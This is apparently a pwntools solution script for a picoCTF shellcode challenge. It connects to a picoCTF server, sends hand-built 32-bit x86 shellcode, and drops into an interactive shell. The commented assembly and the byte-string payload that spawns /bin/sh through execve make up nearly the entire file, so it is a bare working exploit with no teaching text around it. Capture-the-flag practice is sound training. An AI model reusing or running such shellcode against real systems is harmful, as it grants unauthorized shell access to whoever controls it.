#!/bin/python3
from pwn import *
HOST = 'mercury.picoctf.net'
PORT = 35338
r = remote(HOST, PORT)
r.recvuntil(b'Give me code to run:\n')
'''
/*Put the syscall number of execve in eax*/
xor eax, eax
mov al, 0xb
/*Put zero in ecx and edx*/
xor ecx, ecx
xor edx, edx
/*Push "/sh\x00" on the stack*/
xor ebx, ebx
mov bl, 0x68
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
mov bh, 0x73
mov bl, 0x2f
push ebx
nop
/*Push "/bin" on the stack*/
mov bh, 0x6e
mov bl, 0x69
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
shl ebx
mov bh, 0x62
mov bl, 0x2f
push ebx
nop
/*Move the esp (that points to "/bin/sh\x00") in ebx*/
mov ebx, esp
/*Syscall*/
int 0x80
'''
payload = b'\x31\xC0\xB0\x0B\x31\xC9\x31\xD2\x31\xDB\xB3\x68\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x73\xB3\x2F\x53\x90\xB7\x6E\xB3\x69\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x62\xB3\x2F\x53\x90\x89\xE3\xCD\x80'
r.sendline(payload)
r.interactive() 
